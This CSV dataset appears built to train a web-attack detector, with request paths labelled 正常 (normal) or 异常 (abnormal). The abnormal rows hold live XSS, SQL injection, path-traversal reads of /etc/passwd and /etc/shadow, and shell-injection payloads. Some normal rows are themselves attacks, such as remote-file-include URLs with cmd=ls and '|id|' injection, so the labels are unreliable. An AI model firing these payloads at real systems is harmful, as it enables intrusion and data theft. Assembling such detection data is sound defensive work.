label,content
正常,/\xd7\xa7\xd7\x95\xd7\x9c\xd7\xa0\xd7\x95\xd7\xa2/
正常,/tab_ul/
正常,/824524/
正常,/javascript/asp.jpg
异常,<var onmouseover="prompt(1)">On Mouse Over</var>?
异常,/en-us/s7qus4g3.fts?<img src="javascript:alert(cross_site_scripting.nasl);">
正常,/ajax/loadsplash.php?full_path=http://192.168.202.96:8080/llumt7msyau5y?
正常,/gamemini/
正常,/msvms61603cmp/
异常,"""<svg/onload=confirm(0);prompt(0);>"""
异常,/cacti/sendcard.php?view=1&id='sendcard_sql.nasl
正常,/wheel_1/
正常,/fida0a57e14d5f6a02c384e10fd2486472e276d23a0/
正常,/engagements_accueil/
正常,/lib/classes/swift/plugins/reporter.php.~1~
正常,/040753/
正常,/javascript/guestbook.cpp
异常,/manuscripts/
异常,/cgi-bin/type.asp?itype='duware_itype_sql_injection.nasl
异常,/scripts/index.php?search=<script>alert('cmsimple_search_xss.nasl');</script>&function=search
正常,/175401/
异常,%2527%0A%20str%3D%24%28echo%20KARBCX%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%205%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%255C%255C
正常,/space_menu/
正常,/dir-004/
正常,/errors.php?error=http://192.168.202.118:8080/iroy1gvqrrqu?
异常,/main.php?stuff="\x0arm q45664393 #
异常,%2527%26%20sleep%200%20%26%26%20str%3D%24%28echo%20XGXYKB%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%203%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%2522
正常,/549720/
正常,/javascript/xml.html
正常,/898028/
异常,/javascript/wa.exe
正常,/mxbb/modules/kb_mods/includes/kb_constants.php?module_root_path=http://192.168.202.118:8080/tzhfyzkbomspvm?
异常,/scripts/rest/api/2.0.alpha1/serverinfo
正常,/javascript/europe.png
正常,/ra bewitched v1/
正常,/img_3191/
正常,/official calendar 2007 of hilary duff/
正常,/javascript/remove.py
异常,/odzk29aa.fts?<meta http-equiv=set-cookie content="testtfvh=2141">
异常,/admin/components/com_fm/fm.install.php?lm_absolute_path=../../../&install_dir=http://192.168.202.96:8080/4dckqcc0acprbz??
正常,/gruel_gifts/
正常,/admin/st_countries.php?include_path=http://192.168.202.96:8080/ipb5ri??
正常,/rxun5c5ayai/
正常,/mssql.so
正常,/0064531131/
正常,/3dseries/
异常,%3B%20str%3D%24%28echo%20KMVEIH%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%255C%255C
正常,/4ltrwrd/
正常,/gameznflix/
正常,/tip6300/
正常,/148070/
异常,/examples/jsp/jsp2/el/index.php?string='
异常,%u0022%u003e%u003cscript%u003ealert(1);%u003c/script%u003e
异常,/phpmyadmin//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
正常,/thumb_pic11/
正常,/konigwheelstraffic/
异常,hi or 1=1 --"
异常,/inc/download_center_lite.inc.php?script_root=XXpathXX
异常,/uc/avatar.php?uid=-1113%20UNION%20ALL%20SELECT%209925--%20
正常,/public_education/
正常,/parse/parser.php?wn_basedir=http://192.168.202.118:8080/2aibfaczmac8?
异常,/en-us/accountmultihtml.pl?multi=/etc/passwd\x00html
异常,/qb2xy9aw.pl?<img src="javascript:alert(cross_site_scripting.nasl);">
异常,<<SCRIPT>alert("XSS");//<</SCRIPT>
异常,/vwmg565s.mscgi?<img src="javascript:alert(cross_site_scripting.nasl);">
正常,/dance dance revolution extreme_information/
正常,/recordings/theme/_vti_inf.html
正常,/allwebco/
正常,/dvd shrink ver 3/
正常,/manager/include/error/forumerror.cfm?errorno=3
正常,/impex/impexdata.php?systempath=http://cirt.net/rfiinc.txt?
正常,/theme/frames1_top.php?root=http://192.168.202.118:8080/ghl9il?
正常,/alfa8cfront_small1/
正常,/b3943magazine/
正常,/manager/gtcatalog/index.php?function=custom&custom=http://xxxxxxxx/1
异常,""")) or sleep(__TIME__)="""
异常,%27|echo%20WEYPRV$((18%2B9))$(echo%20WEYPRV)WEYPRV&
正常,/kdocker/
异常,/myhome/do.php?ac=-8515%25%27%29%20ORDER%20BY%201%23
正常,/javascript/info.tpl
正常,/recordings/b2-tools/gm-2-b2.php?b2inc=http://xxxxxxxx
异常,%2522%26%20sleep%200%20%26%26%20str%3D%24%28echo%20OLUGPB%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%205%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%22
正常,/nistir-7056/
正常,/bikini blonde masturbates - tight teen pussy/
正常,/111842/
正常,/examples/jsp/cal/admin/cal_login.php
异常,a);/usr/bin/id;
异常,/scripts/1332010202-ror_session_fixation.nasl
异常,%2522%7C%20%5B%207%20-ne%20%24%28echo%20TFJKCP%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%27
异常,/index.php?id=urjhxcl19w'
异常,%27%7C%7Cecho$IFSVCFZJU$((65%2B17))$(echo$IFSVCFZJU)VCFZJU%26
正常,/froken/
正常,/000085951/
正常,/mjsoft/
正常,/107305/
正常,/javascript/trackers.class
正常,/0905wan2/
异常,/javascript/htpasswd.bak
正常,/manilabannerleft/
正常,/robbie williams live at the albert xvid/
正常,/javascript/redirect.msg
正常,/javascript/auth.ws
异常,/myscript-notes/
异常,/top.php?stuff='&del\x09q47253924\x09#
异常,/examples/jsp/jsp2/el/calendar.php?serverpath=/etc/passwd\x00
正常,/video_txt04/
正常,/golden retro hits micro dvd part 1/
正常,/songs of the beatles - gregorian chants/
异常,/zcb/?page=2%25%27%20LIMIT%201%2C1%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%23
异常,/help.php?q=uname >q18373347 #
异常,/scripts/disp_album.php?id_album=0+or+1=1
正常,/3764133/
正常,/ns7590630230/
异常,/).1g(/prog/get_passwd_1.php?user=hehe%3Cscript%3Ealert(42873)%3C/script%3E%20
异常,/en-us/account/autohtml.php?op=modload&mailfile=x&name=../../../../../../../../etc/passwd
异常,/scripts/mundimail/template/simpledefault/admin/_masterlayout.php?top=http://192.168.202.118:8080/moclyxlwqyfjnp?
异常,/rv98iwjp.dll?<script>cross_site_scripting.nasl</script>
正常,/attics/
正常,/talkito/
正常,/privacy_30/
正常,/10466080/
正常,/130282/
正常,/keen 6 - aliens ate my babysitter!/
正常,/158138/
正常,/joinus.php?vwar_root=http://192.168.202.118:8080/2aibfaczmac8??&cmd=ls
异常,/cgi-bin/mailbox.php3?actionid=6&server=x&imapuser=x';somesql&pass=x
正常,/googlepersonalized-tm/
正常,/bee gees a history of song 1967-1990/
正常,/daniel lanois - for the beauty of wynona/
异常,/cacti/download.php?language=/etc/passwd\x00
异常,/zv8tv7h8.cfc?<meta http-equiv=set-cookie content="testcqwz=9752">
异常,/scripts/forum.php3?id_article=1&id_forum=-1/**/union/**/select 368985119--
正常,/turducken/
正常,/movimentosoftwarelivreparana/
正常,/1939buickparts/
正常,/inc/linkbar.php?cfile=http://192.168.202.96:8080/txenjrxf3??
异常,&echo%20ZBAFWV$((66%2B6))$(echo%20ZBAFWV)ZBAFWV%5C%5C
正常,/vm-logo/
正常,/ebook - how to receive gifts in the mail/
正常,/ms-access/
异常,/help.php?q=';del\x09q61196872\x09#
正常,/actualite/
正常,/javascript/web.jsf
异常,/subscriptions.cnf
异常,'%26%26echo%20YBQKFD$((48%2B31))$(echo%20YBQKFD)YBQKFD"
正常,/idarchive/
异常,/wp-login.php?redirect_to=http%3A%2F%2Fwww.lawqt.com%2F5029.html
正常,/css_seo/
异常,"""%7Cecho%20WYANEK$((66%2B6))$(echo%20WYANEK)WYANEK%22"
正常,/javascript/frames.cpp
异常,%2527%7C%20%5B%208%20-ne%20%24%28echo%20OYYPMX%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%252F%252F
异常,%22%26%20sleep%200%20%26%26%20str%3D%24%28echo%20ATDESO%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%203%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20
正常,/ct-mg091996/
正常,/com_directory/modules/mod_pxt_latest.php?globals[mosconfig_absolute_path]=http://192.168.202.96:8080/frznctvhi0i5??
正常,/javascript/aggrespy.tgz
异常,/y8pmygrp.mscgi?<script>cross_site_scripting.nasl</script>
正常,/bold and the beautiful jan 9th 2006/
正常,/flee_gifts/
异常,/phpmyadmin/phprint.php?module=vtiger_lang_crm_lfi.nasl&action=1331923189&lang_crm=../../vtigerservice.php\x00
正常,/downdetails/
异常,/admin/index.php?path_to_script=http://192.168.202.118:8080/zz5thkvtmlgl??&cmd=ls
正常,/py2exe/
正常,/dj dave b/
正常,/542432/
正常,/javascript/scripts.tpl
正常,/semanticwebsite/
异常,/examples/jsp/sessions/faxsurvey?cat /etc/passwd
异常,%27%3B%20str%3D%24%28echo%20ZGYOBQ%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%201%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%252F%252F
正常,/index2-eng/
异常,/member/usercp_menu.php?script_folder=http://192.168.202.118:8080/tzhfyzkbomspvm?
正常,/824255/
正常,/tcpreplay-2/
正常,/examples/jsp/colors/include/error/forumerror.cfm?errorno=3
异常,%27%7Cecho$IFSYKIMMG$((43%2B81))$(echo$IFSYKIMMG)YKIMMG
异常,/wp-login.php?redirect_to=http%3A%2F%2Fwww.lawqt.com%2F5029.html
正常,/javascript/presentations.doc
正常,/blarrow/
正常,/phpmyadmin/security/login
正常,/junkfilter-0/
异常,/1qwv2p5p.x?<script>document.cookie="testvqcy=252;"</script>
异常,"/0_3/connect.php?receive=yes&mod=login&op=callback&referer=webscan%bf%5Cu0027.replace(/.%2b/,/javascript:alert(42873)/.source);//"
正常,/forpol/
异常,/qczkquis.x?<meta http-equiv=set-cookie content="testkwlg=5591">
异常,/iktok2bw.pl?<img src="javascript:alert(cross_site_scripting.nasl);">
正常,/javascript/card.core
异常,/scripts/eezuu7xc7ge3.html
异常,<marquee onStart marquee onStart="javascript:javascript:alert(1)"></marquee onStart>
异常,/main.php?frm_daynight=day&frm_passwd=&frm_referer=http%3a//192.168.26.202/&frm_user=q37639343&scr_height=&scr_width=
异常,%7C%20%5B%204%20-ne%20%24%28echo%20GSLYBH%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20//
正常,/thumbnail-r0/
异常,/i2n4v4rl.aspx?<img src="javascript:alert(cross_site_scripting.nasl);">
正常,/manager-jmx
正常,/zapper/
正常,/computer active - issue 194 july 21 2005/
正常,/j2635-90014/
正常,/palestine-info/
异常,/scriptpath/index.php?page=http://192.168.202.118:8080/ghl9il?
正常,/librariana/
异常,/top.php?stuff=&ver;>q99662165&rem;
异常,/<meta http-equiv=set-cookie content="testftxz=5980">
正常,/albani_1/
正常,/main/inc/stylesheet.php?version=1331921041
正常,/handheld basic plus plus v1/
异常,/lmw4r201.fts?<script>document.cookie="testwews=8477;"</script>
正常,/inkjet printer/
正常,/interwencje/
正常,/javascript/was.nsf
正常,/e stack room 3/
正常,/022706tests-intro/
正常,/citystyle/
正常,/dff_php_frameworkapi-latest/include/dff_mer_prdt.func.php?dff_config[dir_include]=http://192.168.202.96:8080/swgnhpydbq0t?
正常,/50c663ff0e77bdebee7507de7b8d6032_s/
异常,procedure
正常,/alain guiraudie - du soleil pour les gueux/
异常,/75/75922/index.php/cms/item-comment?callback=jsonp1380096883458'%22()%26%25%3Cscript%3Eprompt(42873)%3C/script%3E&iid=114&page=1&view_page=1&_=1380096883791&_ajax_request=
正常,/macraigor systems flash programmer 2/
正常,/addressbook.php?globals[basedir]=http://192.168.202.96:8080/llumt7msyau5y??
正常,/650769/
正常,/justin robertson - presents revtone/
异常,%22%3B%20str%3D%24%28echo%20UYJMIM%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%204%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20//
正常,/soilwork/
正常,/manual/de/mod/mod_authn_default.html
异常,/myhome/do.php?ac=-3662%27%29%20UNION%20ALL%20SELECT%201925%2C%201925%2C%201925--%20&ref
正常,/652344277_s/
异常,/preview.php?php_script_path=http://cirt.net/rfiinc.txt??&cmd=dir
正常,/0296rvl/
正常,/pi20061205_258231/
异常,"/cgi-exe/htimage.exe/path/filename?2,2"
异常,/main.php?stuff="ping -w 11000 -n 1 4.3.2.1|rem 
异常,/javascript/.htpasswd.sfish/skipfish://invalid/;?
正常,/rakhi4/
异常,""",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
异常,/archive.php?scriptpath=http://192.168.202.118:8080/ghl9il??
正常,/12036f-to/
正常,/examples/jsp/jsp2/tagfiles/.products.jsp.swp
正常,/172643/
正常,/lib/classes/swift/dependencyexception.php.1
异常,/6n7aacgg.mscgi?<script>cross_site_scripting.nasl</script>
正常,/mac-xpi/
正常,/060516-online_predators/
正常,/yellowtextonly/
正常,/javascript/cert.bat
正常,/psdasilva/
正常,/4684_80x80/
异常,/opensiteadmin/scripts/classes/databasemanager.php?path=http://192.168.202.96:8080/no4ghqiguzhst?\x00
异常,%2527%0A%20str%3D%24%28echo%20GBQYNR%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%208%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%7C
正常,/socceram 12th march 2005 352x288 xvid english pts/
正常,/inhollywoodtwocompaniesbattleoverinflatableairheads/
异常,%2527%7C%20%5B%201%20-ne%20%24%28echo%20LVDDNF%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%2527
正常,/javascript/~eric.dat
正常,/javascript/mta.html
正常,/google_goofs/
异常,<embed src=javascript:alert(1)> 
异常,/..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f{FILE}
异常,/subscriptions.config
正常,/cgan443l/
异常,%26%20sleep%200%20%26%26%20str%3D%24%28echo%20HSRGRG%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%205%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%257C
正常,/154262/
异常,%7Cecho%20LZYGCY$((26%2B70))$(echo%20LZYGCY)LZYGCY%2F%2F
正常,/javascript/other.save
正常,/541459/
正常,/aliensvspredator2vallversionsnocdpatchall/
正常,/wapchat/src/eng.writemsg.php?sysfiledir=http://cirt.net/rfiinc.txt?
正常,/186582/
正常,/examples/servlets/servlet/preferences.php?action=setcookie
正常,/javascript/level.as
正常,/javascript/engine.rar
异常,/scripts/index.php?edit=nonexistant138490642
正常,/c8e2845zbfppnk74s8n/
正常,/sb116537102370441882-vyxiz8u2pqswrosqmiexezq4zby_20061213/
正常,/include/inc_freigabe1.php?include_path=http://cirt.net/rfiinc.txt?
异常,%2522%26%20sleep%200%20%26%26%20str%3D%24%28echo%20NDPSSM%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%203%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%2527
正常,/javascript/banner.core
异常,/perlscripts/
正常,/jobs_karriere/
正常,/121_65/
正常,/j smiles gangstaz against snitchez_london edition)/
异常,/p043snfr.jsp?<img src="javascript:alert(cross_site_scripting.nasl);">
正常,/hioxbannerrotate.php?hm=http://192.168.202.118:8080/ghl9il?
正常,/pokemon01-s/
正常,/159768/
正常,/cacti/login.cgi?username=&command=simple&do=edit&password=&file=|id|
异常,/admin/bin/patch.php?INSTALL_FOLDER=XXpathXX
异常,/%22/swfupload/swfupload.swf?debugEnabled=true&movieName=%22])%7Dcatch(e)%7Bif(!window.x)%7Balert(1);window.x=1%7D%7Dtry%7B([%22
正常,/javascript/folder.core
正常,/pano2exe_v2/
异常,/ewc3rz1l.php3?<script>document.cookie="testkgqo=204;"</script>
异常,/8x6w469u.idc?<meta http-equiv=set-cookie content="testgfjr=1286">
异常,/myhome/do.php?ac=-8190%22%20UNION%20ALL%20SELECT%205751%2C%205751%2C%205751%23&ref
正常,/best goals of 2005 quality streaming 340 kbps/
异常,/examples/jsp/num/index.php?show=/etc/passwd
异常,%26%20sleep%200%20%26%26%20str%3D%24%28echo%20ZPLJWX%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%208%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%2526
正常,/000052373/
正常,/20060504-3/
正常,/39a6405832eca1a28c3248ea99f79e9a01d3e33d/
正常,/edit.php?javascript_path=http://192.168.202.96:8080/txenjrxf3??
正常,/run.php?dir=shell?&file=http://192.168.202.118:8080/2aibfaczmac8?
异常,/main.php?logout="&ver\x09>q14643294&rem\x09
正常,/fatimacigarettes/
正常,/dynadalt/
正常,/examples/jsp/jsptoserv/jsptoservlet.jsp
异常,/help.php?q=";del\x09q77596328\x09#
异常,/help.php?q='\x0arm\x09q79344163\x09#
正常,/lindsay lohan when she was still sexy picture viewer/
异常,%27%3B%20str%3D%24%28echo%20FBVDTE%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%208%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2522
正常,/suppoff/
正常,/top.php?stuff=|ping -w 7000 -n 1 4.3.2.1|rem 
正常,/php/includes/header.inc.php?root=http://192.168.202.96:8080/vir0v3xfc??
异常,/scripts/polls.scr.php?GLOBALS[PTH][classes]=XXpathXX?
正常,/gamefeaturelegionarenacultofmithras/
正常,/musei-virtuali/
异常,/vmi8bb12.cfm?<meta http-equiv=set-cookie content="testlerc=2575">
正常,/belegungsplan/tagesuebersicht.inc.php?root=@rfiurl
异常,/help.php?q="|ping -w 9000 -n 1 1.2.3.4|rem 
正常,/u_5000a/
正常,/news83956283/
正常,/examples/jsp/jsp2/jspx/.textrotate.jspx.swp
正常,/special forces redefine post cold war military doctrine/
正常,/b000fmgtwg/
正常,/ttelephone/
正常,/psp - broken sword 1 scummvm for psp 0/
正常,/examples/servlets/servlet/remotehtmlview.php?phpads_path=http://xxxxxxxx
正常,/werb_down/
正常,/small4475/
异常,/help.php?q="rm\x09q14739543&rem\x09
异常,/en-us/odzk29aa.dll?<meta http-equiv=set-cookie content="testtfvh=2141">
异常,%27%7C%20%5B%207%20-ne%20%24%28echo%20RLZFDE%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%23
正常,/circadia/
正常,/520936/
正常,/r1_rim/
正常,/someunexistantstuff464107377891504006.html
异常,/uc/avatar.php?uid=-5183%20ORDER%20BY%201%23
异常,/examples/jsp/colors/htgrep/file=index.html&hdr=/etc/passwd
正常,/9cdef91f12794d20a9e50191028c2bf3edcfec27/
正常,/fidb60de9d763398af41fd5a61bcfccef97d896544a/
异常,/leaderscript/
异常,"/myhome/do.php/topics.php?op=viewtopic&topic=-1+Union+select+1,2,3,md5(7)"
正常,/article2669/
异常,/cacti/index.php?album=../../../../../../../../../../etc/passwd\x00
正常,/remember_me/
正常,/memojowiki/
正常,/merchant_policy/
正常,/custom_vars.php?sys[path_addon]=http://192.168.202.118:8080/ghl9il?
异常,..\..\..\..\..\..\..\..\..\..\etc\shadow%00
异常,/cgi-bin/phprint.php?module=vtiger_lang_crm_lfi.nasl&action=1331908691&lang_crm=../../../../../../../../../../../..//etc/passwd\x00
正常,/lib/classes/swift/transport/smtpagent.php~
正常,/0596100795_bkt/
正常,/446617/
正常,/buyvrsdld/
异常,/mpcgi/a1stats/a1disp4.cgi?../../../../../../../etc/passwd
正常,/javascript/posts.tar.gz
正常,/navbaroff_10/
异常,<a href="\x04javascript:javascript:alert(1)" id="fuzzelement1">test</a>
异常,/cgi-bin/shop.pl/page=;cat shop.pl|
异常,ftp://192.168.23.103/*<apache_mod_proxy_ftp_glob_xss.nasl>
异常,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20/*"
正常,/folding_chair/
正常,/74f3ac6620b69e6c2bf4d913985027c5_3/
正常,/index.php?bibtexrootrel=http://192.168.202.118:8080/zz5thkvtmlgl??
异常,<svg onresize="alert(1)">
异常,/help.php?q=;del\x09q16213317\x09#
正常,/red hot chili peppers - californication/
正常,/en-us/manager/search/apps/local/_new
正常,/manager/services/help/?module=horde&show=menu
正常,/104424/
正常,/r-mail/
正常,/8820041324p/
异常,%7C%20%5B%209%20-ne%20%24%28echo%20FTWOKG%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%257C
正常,/illustrator9tips/
正常,/default_3419fee841e048e183c41ecd03758c3c/
正常,/esquire/
正常,/70-552/
异常,"<img src=x onerror=x.onerror=m='%22%3E%3Cimg%20src%3Dx%20onerror%3Dx.onerror%3Dprompt%28/xss/.source%29%3E';d=unescape(m);document.write(d);prompt(String.fromCharCode(88,83,83))>"
正常,/jamiroquai - travelling without moving/
正常,/core/includes.php?cms_root=http://cirt.net/rfiinc.txt??
正常,/553740/
正常,/input-peripherals/
异常,/..../..../..../..../..../..../..../..../{FILE}
异常,/javascript/vfs.exe
正常,/chinese-r0/
正常,/page-145/
异常,||echo%20CZQCUH$((88%2B14))$(echo%20CZQCUH)CZQCUH%26
正常,/javascript/onbound.temp
正常,/193408_1/
正常,/grandtheftautosanandreasplus27trainer/
异常,<!--#echo var="http_cookie" -->
正常,/library/js/fancybox/fancy_shadow_ne.png
异常,/help.php?q="&del\x0cq33739327&rem\x0c
异常,/u8yiqilu.nsf?<script>document.cookie="testswjp=6010;"</script>
正常,/javascript/count.cgi
正常,/news/newstopic_inc.php?indir=http://192.168.202.118:8080/2aibfaczmac8?
正常,/34791_2165321/
正常,/asian secrets - carrera at the beach/
异常,'%26%26echo%20AKFLIE$((27%2B64))$(echo%20AKFLIE)AKFLIE
异常,%22%3B%20str%3D%24%28echo%20WBDHXY%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%23
